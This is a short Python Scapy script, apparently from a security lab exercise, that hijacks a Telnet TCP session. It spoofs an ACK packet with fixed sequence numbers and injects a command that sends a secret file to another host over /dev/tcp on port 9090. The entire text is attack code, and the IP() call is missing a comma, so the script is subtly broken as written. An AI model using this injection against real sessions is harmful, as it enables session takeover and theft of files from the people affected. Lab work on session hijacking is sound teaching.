import sys
from scapy.all import *

IPLayer = IP(src="10.10.1.178" dst="10.10.1.190")
TCPLayer = TCP(sport=56570, dport=23, flags="A", seq=1493901902, ack=1177796391)
Data = "\r cat /home/seed/secret.txt > /dev/tcp/10.10.1.178/9090\r"
pkt = IPLayer/TCPLayer/Data
ls(pkt)
send(pkt, verbose=0)
